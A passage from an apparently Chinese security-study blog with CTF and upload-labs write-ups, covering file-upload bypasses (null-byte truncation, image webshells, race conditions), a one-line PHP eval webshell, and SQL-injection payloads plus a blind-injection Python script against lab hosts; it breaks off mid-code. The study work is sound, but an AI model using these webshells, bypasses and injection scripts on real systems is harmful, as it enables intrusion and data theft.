class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);<span class="comment">//白名单</span></span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="title function_ invoke__">strrpos</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);<span class="comment">//后缀</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;<span class="comment">//后缀存在</span></span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">        <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以通过截断上传（0x00，%00，&#x2F;00 ）实现。<code>a.php%00</code>，filename要改成jpg</p>
<p>（1）php版本要小于5.3.4。</p>
<p>（2）文件路径可控。</p>
<p>（3）magic_quotes_gpc需要为OFF状态。（在php.ini中）</p>
<h2 id="13"><a href="#13" class="headerlink" title="13"></a>13</h2><p>save_path变成了POST提交,区别在于不对%00自动编码，需手动解码</p>
<h2 id="14-16"><a href="#14-16" class="headerlink" title="14-16"></a>14-16</h2><p>图片马cmd执行<code>copy a.jpg/b+ b.php c.jpg</code></p>
<p>可以绕过getimagesize()函数来实现对文件类型的识别判断,exif_imagetype()函数获得图片文件的类型，从而实现文件白名单的过滤操作。</p>
<p>利用文件包含来使用木马</p>
<h2 id="17"><a href="#17" class="headerlink" title="17"></a>17</h2><p>二次渲染绕过</p>
<p>绕过二次渲染的核心思想便是先上传一张图片，再将上传完成后的图片下载下来，对比渲染前后图片的编码变化，将我们的代码写在未被渲染的区域便可绕过二次渲染。<br>由于不同格式文件的特性，在进行绕过二次渲染时，选用gif的图像最容易成功，对于jpg和png这两种图片需要用脚本进行改写，也不在进行尝试。</p>
<p>用winhex工具,在最后加上php代码</p>
<p><img src="/../images/0413-1.png"></p>
<p>将渲染后的gif文件下载到本地，通过对比软件对比渲染前后的十六进制数据。下图左为渲染前，右为选然后的文件。未标红的即为前后未发生变化的区域。</p>
<p><img src="/../images/0413-2.png"></p>
<p>将木马写到该区域再次进行尝试上传并利用文件包含访问。</p>
<h2 id="17-1"><a href="#17-1" class="headerlink" title="17"></a>17</h2><p>条件竞争</p>
<p>分析源码，对于上传的文件处理是先保存到服务器，再对比拓展名，如果拓展名不属于白名单中的三种后缀，便由18行的操作执行unlink操作将保存的文件删除</p>
<p><code>&lt;?php fputs(fopen(&#39;info.php&#39;,&#39;w&#39;),&#39;&lt;?php phpinfo();?&gt;&#39;);?&gt;</code>通过写入这行代码，一旦竞争成功，文件会留在服务器，可访问此文件调用phpinfo()</p>
<h2 id=""><a href="#" class="headerlink" title=""></a><img src="/../images/0413-3.png"></h2><p>bp的intruder模块发包，自己去浏览器刷新或者用python脚本</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://192.168.159.128/upload-labs-master/upload/eval.php&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    html = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> html.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;OK&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="19"><a href="#19" class="headerlink" title="19"></a>19</h2><p>同样是条件竞争,只不过需要图片马,把上面的代码写进图片即可</p>
<p>Pass19 — %00截断，参考Pass11<br>Pass20 — 0X00截断，参考Pass12</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://dyinglight5.github.io/posts/upload-labs%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" data-id="clyyhqmoz000t0ov5gxrphziy" data-title="upload-labs刷题笔记" class="article-share-link"><span class="fa fa-share">分享</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag">学习笔记</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-文件上传漏洞学习笔记" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/posts/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="article-date">
  <time class="dt-published" datetime="2024-04-03T11:49:51.000Z" itemprop="datePublished">2024-04-03</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/posts/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">文件上传漏洞学习笔记</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><p>参考文章:<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43390703/article/details/104858705">https://blog.csdn.net/qq_43390703/article/details/104858705</a></p>
<h3 id="什么是文件上传漏洞？"><a href="#什么是文件上传漏洞？" class="headerlink" title="什么是文件上传漏洞？"></a>什么是文件上传漏洞？</h3><p>攻击者上传可执行的动态脚本文件，可以是木马，病毒，恶意脚本或者WebShell等。</p>
<p>什么是webshell？<br>WebShell就是以<strong>asp</strong>、<strong>php</strong>、<strong>jsp</strong>或者<strong>cgi</strong>等网页文件形式存在的一种命令执行环境，也可以将其称之为一种网页后门。攻击者在入侵了一个网站后，通常会将这些asp或php后门文件与网站服务器web目录下正常的网页文件混在一起，然后使用浏览器来访问这些后门，得到一个命令执行环境，以达到控制网站服务器的目的（可以上传下载或者修改文件，操作数据库，执行任意命令等）。 WebShell后门隐蔽较性高，可以轻松穿越防火墙，访问WebShell时不会留下系统日志，只会在网站的web日志中留下一些数据提交记录。</p>
<h3 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h3><ul>
<li>对上传文件的后缀名没有做较为严格的限制</li>
<li>对上传文件的MIMETYPE没有做检查</li>
<li>权限上没有对于上传的文件目录设置不可执行权限</li>
<li>对于web server对于上传文件或者指定目录的行为没有做限制</li>
</ul>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>WEB中上传文件，服务器读取这个分段(multipart)提取并保存，通常，在进行文件保存的时候，服务器端会读取文件的原始文件名，并从这个原始文件名中得出文件的扩展名，而后随机为文件起一个文件名 ( 为了防止重复 )，并且加上原始文件的扩展名来保存到服务器上</p>
<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><ol>
<li>上传web脚本语言，服务器执行恶意代码</li>
<li>上传flash的策略文件crossdomain.xml，攻击者控制在该域的行为</li>
<li>上传病毒木马，诱导用户下载执行</li>
<li>上传钓鱼图片</li>
<li>上传php脚本，文件包含执行</li>
</ol>
<h3 id="防范与绕过"><a href="#防范与绕过" class="headerlink" title="防范与绕过"></a>防范与绕过</h3><h4 id="1-前端过滤"><a href="#1-前端过滤" class="headerlink" title="1.前端过滤"></a>1.前端过滤</h4><h5 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a><strong>原理</strong></h5><p><strong>在表单中使用onsumbit&#x3D;checkFile()调用js函数来检查上传文件的扩展名。当用户在客户端选择文件点击上传的时候，客户端还没有向服务器发送任何消息，就对本地文件进行检测来判断是否是可以上传的类型，这种方式称为前台脚本检测扩展名。</strong></p>
<h5 id="绕过方法："><a href="#绕过方法：" class="headerlink" title="绕过方法："></a>绕过方法：</h5><p>上传一句话木马，改名jpg格式，bp抓包改回php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="2-检查扩展名"><a href="#2-检查扩展名" class="headerlink" title="2.检查扩展名"></a>2.检查扩展名</h4><p>在服务器进行检查，过滤掉不合法的扩展名文件，有白名单和黑名单</p>
<p>绕过方法：在一些Web server中，存在解析漏洞:<br>1.老版本的IIS6中的目录解析漏洞，如果网站目录中有一个 <strong>&#x2F;.asp&#x2F;目录</strong>，那么此目录下面的一切内容都会被当作asp脚本来解析<br>2.老版本的IIS6中的<strong>分号漏洞</strong>：IIS在解析文件名的时候可能将分号后面的内容丢弃，那么我们可以在上传的时候给后面加入分号内容来避免黑名单过滤，如 a.asp;jpg<br>3.旧版Windows Server中存在<strong>空格和dot漏洞</strong>类似于 <strong>a.php. 和 a.php[空格]</strong> 这样的文件名存储后会被windows去掉点和空格，从而使得加上这两个东西可以突破过滤，成功上传，并且被当作php代码来执行<br>4.nginx(0.5.x, 0.6.x, 0.7 &lt;&#x3D; 0.7.65, 0.8 &lt;&#x3D; 0.8.37**)空字节漏洞 xxx.jpg%00.php** 这样的文件名会被解析为php代码运行（fastcgi会把这个文件当php看，不受空字节影响，但是检查文件后缀的那个功能会把空字节后面的东西抛弃，所以识别为jpg）<br>5.apache1.x,2.x的<strong>解析漏洞</strong>，上传如<strong>a.php.rar a.php.gif</strong> 类型的文件名，可以避免对于php文件的过滤机制，但是由于apache在解析文件名的时候<strong>是从右向左读</strong>，如果遇到不能识别的扩展名则跳过，rar等扩展名是apache不能识别的，因此就会直接将类型识别为php，从而达到了注入php代码的目的</p>
<h4 id="检查Content-Type"><a href="#检查Content-Type" class="headerlink" title="检查Content-Type"></a>检查Content-Type</h4><h5 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h5><p>HTTP协议规定了上传资源的时候在Header中加上一项文件的MIMETYPE，来识别文件类型，这个动作是由浏览器完成的，服务端可以检查此类型不过这仍然是不安全的,因为HTTP header可以被发出者或者中间人任意的修改。</p>
<h5 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h5><p>使用各种各样的工具（如burpsuite）强行篡改Header就可以，将Content-Type: application&#x2F;php改为其他web程序允许的类型。</p>
<h4 id="3-文件头检查文件"><a href="#3-文件头检查文件" class="headerlink" title="3.文件头检查文件"></a>3.文件头检查文件</h4><h5 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h5><p>利用的是每一个特定类型的文件都会有不太一样的开头或者标志位。</p>
<p>例如：TIFF (tif)  49492A00</p>
<h5 id="绕过方法-1"><a href="#绕过方法-1" class="headerlink" title="绕过方法"></a>绕过方法</h5><p>给上传脚本加上相应的幻数头字节就可以，php引擎会将 &lt;?之前的内容当作html文本，不解释而跳过之，后面的代码仍然能够得到执行比如下面：<br>（一般不限制图片文件格式的时候使用GIF的头比较方便（47494638），因为全都是文本可打印字符。）</p>
<h4 id="4-限制Web-Server对特定类型文件的行为"><a href="#4-限制Web-Server对特定类型文件的行为" class="headerlink" title="4.限制Web Server对特定类型文件的行为"></a>4.限制Web Server对特定类型文件的行为</h4><h5 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h5><p>导致文件上传漏洞的根本原因在于服务把用户上传的本应是数据的内容当作了代码，一般而言：用户上传的内容都会被存储到特定的一个文件夹下，比如我们很多人习惯于放在 .&#x2F;upload&#x2F; 下面要防止数据被当作代码执行，我们可以限制web server对于特定文件夹的行为。(在Response的Content-type修改)</p>
<ol>
<li><p>指定特定文件名的处理方式(纯文本)<code>   AddType text/plain .pl .py .php</code></p>
</li>
<li><p>完全禁止特定扩展名的文件被访问(黑名单)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">   Options -ExecCGI</span><br><span class="line">   AddHandler cgi-script .php .pl .py .jsp .asp .htm .shtml .sh .cgi识别</span><br><span class="line"></span><br><span class="line">3. 强制web服务器对于特定文件类型的处理，**与第一条不同的是， 下面的方法直接强行让apache将文件识别为你指定的类型，而第一种是让浏览器符合上面正则的全部被认为是纯文本，也可以继续往里面加入其他类型。**</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>&lt;FilesMatch “.(php|pl|py|jsp|asp|htm|shtml|sh|cgi)$”&gt;<br>ForceType text&#x2F;plain</p>
</FilesMatch>
```
</li>
<li><p>只允许访问特定类型文件(白名单)</p>
</li>
</ol>
<h5 id="绕过方法-2"><a href="#绕过方法-2" class="headerlink" title="绕过方法"></a>绕过方法</h5><p>可以通过 move_uploaded_file 函数把自己写的.htaccess 文件上传，<strong>覆盖掉服务器上的文件，来定义文件类型和执行权限</strong>如果做到了这一点，将获得相当大的权限。</p>
<p>补充知识htaccess：</p>
<p>.htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。概述来说，htaccess文件是Apache服务器中的一个配置文件，它<strong>负责相关目录下的网页配置</strong>。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p>
<h4 id="5-。文件系统00阻断"><a href="#5-。文件系统00阻断" class="headerlink" title="5,。文件系统00阻断"></a>5,。文件系统00阻断</h4><h5 id="原理-5"><a href="#原理-5" class="headerlink" title="原理"></a>原理</h5><p><strong>在上传的时候，当文件系统读到【0x00】时，会认为文件已经结束。</strong>利用00截断就是利用程序员在写程序时对文件的上传路径过滤不严格，产生0x00、%00上传截断漏洞。</p>
<h5 id="绕过方法-3"><a href="#绕过方法-3" class="headerlink" title="绕过方法"></a><strong>绕过方法</strong></h5><p>通过抓包截断将【evil.php.jpg】后面的一个【.】换成【0x00】。在上传的时候，当文件系统读到【0x00】时，会认为文件已经结束，从而将【evil.php.jpg】的内容写入到【evil.php】中，从而达到攻击的目的。</p>
<h4 id="6-NTFS文件系统特性绕过"><a href="#6-NTFS文件系统特性绕过" class="headerlink" title="6.NTFS文件系统特性绕过"></a>6.NTFS文件系统特性绕过</h4><p>NTFS交换数据流（alternate data streams简称ADS）是NTFS磁盘格式的新特性，见漏洞详细可查CVE-1999-0278。</p>
<p>一个完整的流的格式为：::<br>文件主流即我们平时可以看见的可以存储数据的文件。而非主文件流寄宿于主文件流中，无法直接读取。<br>修改宿主文件的内容或流的内容，不会对彼此造成影响。<br>流类型总是以符 号 作 为 开 始 ，NTFS文 件 系 统 中 的 文 件 至 少 包 含 一 个 主 流 ， 也 就 是data流 ( 符号作为开始，NTFS文件系统中的文件至少包含一个主流，也就是data流(符号作为开始，NTFS文件系统中的文件至少包含一个主流，也就是data流(DATA)，默认流名为空。<br>ADS可以省略流名，但不能省略流类型。<br>NTFS文件系统中的文件夹没有data流，但可以指派data流，文件夹的主流为directory流 ， 流 名 默 认 为 l30<br><strong>当我们对一个在NTFS分区中的ASP文件发出包含D A T A 请 求 ， I I S 会 检 查 最 后 一 个 “ . ” 后 面 的 扩 展 名 ， 因 为 多 了 : : DATA请求，IIS会检查最后一个“.”后面的扩展名，因为多了::DATA请求，IIS会检查最后一个“.”后面的扩展名，因为多了::DATA，结果IIS不认为这是一个ASP文件，而文件系统可以识别该请求，于是返回ASP的源代码。</strong></p>
<h5 id="绕过方法-4"><a href="#绕过方法-4" class="headerlink" title="绕过方法"></a>绕过方法</h5><p>看不懂先跳了</p>
<h4 id="7-二次渲染绕过"><a href="#7-二次渲染绕过" class="headerlink" title="7.二次渲染绕过"></a>7.二次渲染绕过</h4><p>图片的二次渲染形成代码</p>
<h4 id="8-条件竞争"><a href="#8-条件竞争" class="headerlink" title="8.条件竞争"></a>8.条件竞争</h4><h5 id="原理-6"><a href="#原理-6" class="headerlink" title="原理"></a>原理</h5><p>与服务端频繁交互导致处理顺序出错</p>
<h4 id="9-其他漏洞"><a href="#9-其他漏洞" class="headerlink" title="9.其他漏洞"></a>9.其他漏洞</h4><ol>
<li>后缀名大小写绕过 用于只将小写的脚本后缀名(如php)过滤掉的场合； 例如:将Burpsuite截获的数据包中的文件名【evil.php】改为【evil.Php】</li>
<li>双写后缀名绕过 用于只将文件后缀名过滤掉的场合，例如”php”字符串过滤的； 例如:上传时将Burpsuite截获的数据包中文件名【evil.php】改为【evil.pphphp】，那么过滤了第一个”php”字符串”后，开头的’p’和结尾的’hp’就组合又形成了【php】。</li>
<li>特殊后缀名绕过 用于检测文件合法性的脚本有问题的场合； 例如:将Burpsuite截获的数据包中【evil.php】名字改为【evil.php6】，或加个空格改为【evil.php 】等。</li>
</ol>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://dyinglight5.github.io/posts/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" data-id="clyyhqmoz000x0ov52pbn0aqn" data-title="文件上传漏洞学习笔记" class="article-share-link"><span class="fa fa-share">分享</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag">学习笔记</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-20240331刷题日记-sql" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/posts/20240331%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-sql/" class="article-date">
  <time class="dt-published" datetime="2024-03-31T03:51:01.000Z" itemprop="datePublished">2024-03-31</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/ctf%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0/">ctf刷题日记</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/posts/20240331%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-sql/">20240331刷题日记-sql</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="20240331刷题日记"><a href="#20240331刷题日记" class="headerlink" title="20240331刷题日记"></a>20240331刷题日记</h1><h2 id="sql-sample复现"><a href="#sql-sample复现" class="headerlink" title="sql_sample复现"></a>sql_sample复现</h2><p>找不到注入点，什么都被过滤，想起来有个robots.txt文件，发现hint</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Only u input the correct password then u can get the flag</span><br><span class="line">and wxccc yyds.</span><br><span class="line"></span><br><span class="line">select * from users where username=&#x27;$_POST[&quot;username&quot;]&#x27; and password=&#x27;$_POST[&quot;password&quot;]&#x27;;</span><br></pre></td></tr></table></figure>

<p>密码必须输入wxccc？username单引号闭合</p>
<p>没思路，去看wp了</p>
<p><img src="/../images/sql.png"></p>
<p>根据sql语句，可以加入\使引号改变闭合</p>
<p>payload可以是password&#x3D;or 1 #&amp;username&#x3D;admin\</p>
<img src="../images/0331-2.png"  />

<p>可以看到回显改变了，由于没学python，copy了一下脚本，用的应该是bool盲注</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://210.30.97.133:28095/index.php&quot;</span></span><br><span class="line">temp = &#123;&#125;</span><br><span class="line">password = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">    time.sleep(<span class="number">0.06</span>)</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high =<span class="number">128</span></span><br><span class="line">    mid = (low+high)//<span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span>(low&lt;high):</span><br><span class="line">        payload = <span class="string">&#x27;^ (ascii(substr((password),%d,1))&gt;%d)#&#x27;</span> % (i,mid)</span><br><span class="line">        <span class="comment"># select * from test where name=&#x27;admin\&#x27; and password=^ (ascii(substr((password),%d,1))&gt;%d)#</span></span><br><span class="line">        <span class="comment"># &#x27;admin and password=&#x27;^ (ascii(substr((password),%d,1))&gt;%d)   异或必为真</span></span><br><span class="line">        temp=&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;admin\\&quot;</span>,<span class="string">&quot;password&quot;</span>: payload&#125;</span><br><span class="line">        r = requests.post(url,data=temp)</span><br><span class="line">        <span class="built_in">print</span>(low,high,mid,<span class="string">&quot;:&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;wxccc&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low = mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid =(low+high)//<span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span>(mid ==<span class="number">32</span> <span class="keyword">or</span> mid ==<span class="number">127</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    password +=<span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(password)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;password=&quot;</span>,password)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这下知道wxccc是干嘛的了，标记正确页面，运行得到密码</p>
<p>password&#x3D; OhyOuFOuNdit</p>
<p>在网页登录就拿到flag了</p>
<p><img src="/../images/0331-3.png"></p>
<p>异或的用法第一次见到，长知识了</p>
<p>参考文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/SopRomeo/article/details/105123395">https://blog.csdn.net/SopRomeo/article/details/105123395</a></p>
<h2 id="fakebook"><a href="#fakebook" class="headerlink" title="fakebook"></a>fakebook</h2><p>1.添加用户</p>
<p><img src="/../images/0331-4.png"></p>
<p>2.点进去admin，发现url中有get no，尝试注入</p>
<p>?no&#x3D;1’ 会报错’’’，猜是数字型注入</p>
<p>?no&#x3D;1 group by 4–+    列数为4</p>
<p>?no&#x3D;1’ union select 1,2,3,4–+ <img src="/../images/0331-5.png"></p>
<p>union select被过滤了,但是各自没有单独过滤,加注释绕过?no&#x3D;-1 union &#x2F;* *&#x2F; select 1,2,3,4–+</p>
<p><img src="/../images/0331-6.png"></p>
<p>2是回显位，?no&#x3D;-1 union &#x2F;* *&#x2F; select 1,database(),3,4–+查库名</p>
<p><img src="/../images/0331-7.png"></p>
<p>?no&#x3D;-1 union &#x2F;* *&#x2F; select 1,group_concat(table_name) from information_schema.tables,3,4#</p>
<p>在3,4处一直报错找不到原因，干脆用updatexml报错注入</p>
<p>?no&#x3D;-1 union &#x2F;* *&#x2F; select 1,updatexml(1,concat(‘~’,(select table_name from information_schema.tables where table_schema&#x3D;’fakebook’)),3),3,4#</p>
<p><img src="/../images/0331-8.png"></p>
<p>?no&#x3D;-1 union &#x2F;* *&#x2F; select 1,updatexml(1,concat(‘~’,<br>(select column_name from information_schema.columns where table_schema&#x3D;’fakebook’ and table_name&#x3D;’users’ limit 0,1)),3),3,4#</p>
<p>回显<code>[*] query error! (XPATH syntax error: &#39;~no&#39;)</code></p>
<p>逐行读取：no username passwd data </p>
<p>?no&#x3D;-1 union &#x2F;* *&#x2F; select 1,updatexml(1,concat(‘~’,<br>(select group_concat(username,passwd) from users)),3),3,4#</p>
<p>回显<code>[*] query error! (XPATH syntax error: &#39;~adminc7ad44cbad762a5da0a452f9e8&#39;)</code></p>
<p>暂且不知道有什么用</p>
<p>登录不上去，卡住了TAT</p>
<p><img src="/../images/0331-9.png"></p>
<p>robots.txt扫到这个文件，下载后打开</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$blog</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;age = (<span class="keyword">int</span>)<span class="variable">$age</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;blog = <span class="variable">$blog</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$output</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span 